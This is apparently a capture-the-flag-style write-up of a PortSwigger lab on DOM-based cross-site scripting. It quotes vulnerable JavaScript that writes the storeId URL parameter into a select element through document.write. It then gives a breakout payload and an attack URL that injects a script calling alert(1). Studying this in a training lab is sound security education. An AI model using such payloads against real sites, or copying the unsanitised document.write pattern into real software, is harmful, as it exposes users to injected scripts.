
# DOM XSS in document.write sink using source location.search inside a select element

This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search which you can control using the website URL. The data is enclosed within a select element.

To solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the alert function.

---------------------------------------------

References:

- https://portswigger.net/web-security/cross-site-scripting/dom-based

---------------------------------------------


The sink is:

```
var stores = ["London","Paris","Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
if(store) {
    document.write('<option selected>'+store+'</option>');
}
for(var i=0;i<stores.length;i++) {
    if(stores[i] === store) {
        continue;
    }
    document.write('<option>'+stores[i]+'</option>');
}
document.write('</select>');
```




![img](images/DOM%20XSS%20in%20document.write%20sink%20using%20source%20location.search%20inside%20a%20select%20element/1.png)


The parameter storeId is written between "<option selected>" and "</option>". That means if we add that value in the GET request it appears between the options, for example accessing "/product?productId=4&storeId=1":



![img](images/DOM%20XSS%20in%20document.write%20sink%20using%20source%20location.search%20inside%20a%20select%20element/2.png)


To escape the option tags we can use the payload:

```
</option><script>alert(1)</script><option selected>
```

```
/product?productId=4&storeId=</option><script>alert(1)</script><option%20selected>
```



![img](images/DOM%20XSS%20in%20document.write%20sink%20using%20source%20location.search%20inside%20a%20select%20element/3.png)
